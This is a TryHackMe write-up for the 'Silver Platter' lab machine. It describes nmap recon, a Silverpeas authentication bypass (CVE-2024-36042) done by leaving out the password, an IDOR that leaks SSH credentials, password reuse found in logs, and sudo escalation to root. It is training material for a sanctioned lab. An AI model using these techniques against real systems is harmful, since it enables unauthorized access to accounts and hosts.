---
title: Silver Platter
description: Writeup for the TryHackMe machine Siler Platter
date: 2025-01-10
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds three open ports: SHH (22) and HTTP (80, 8080).
```
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close
```

### HTTP - TCP 80

The contact page mentions Silverpeas software and references the username `scr1ptkiddy`.

### HTTP - TCP 8080

The path `/silverpeas` redirects to a Silverpeas login page. A search for vulnerabilities in Silverpeas reveals [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d), an authentication bypass vulnerability.

## Shell as tim

Using the username `scr1ptkiddy`, I intercept the login request with BurpSuite and omit the password field to exploit the authentication bypass. The user’s account contains one unread notification:
```
Tyler just asked if I wanted to play VR but he left you out scr1ptkiddy (what a jerk). Want to join us? We will probably hop on in like an hour or so. 
```
I inspect the inbox and intercept the following request while accessing a notification:
```
GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5 HTTP/1.1
Host: 10.x.x.x:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://10.10.121.39:8080/silverpeas/RSILVERMAIL/jsp/Main
Cookie: JSESSIONID=Ow3YyDp2j7FTBM-pn6qHQHmJZE4zMUytia05jAbF.ebabc79c6d2a; defaultDomain=0; svpLogin=scr1ptkiddy; Silverpeas_Directory_Help=IKnowIt
Upgrade-Insecure-Requests: 1
```
Testing the `ID` parameter for an IDOR vulnerability is successful. Changing `ID=5` to `ID=6` reveals another message containing SSH credentials: `tim:<REDACTED>`.

## Shell as tyler

The `/etc/passwd` file reveals another user, `tyler`:
```
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000:root:/home/tyler:/bin/bash
tim:x:1001:1001::/home/tim:/bin/bash
```
{: file="/etc/passwd" }
Searching through log files for mentions of `tyler` yields a database password:
```console
tim@silver-platter:/var/log$ grep -iR tyler 2>/dev/null
[...]
auth.log.2:Dec 13 15:41:17 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
auth.log.2:Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=<REDACTED> -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
[...]
```
Testing the credentials `tyler:<REDACTED>` for SSH is successful.

## Shell as root

The `sudo` privileges for `tyler` allow running all commands as root:
```console
tyler@silver-platter:~$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```
Executing `sudo su` grants a root shell.
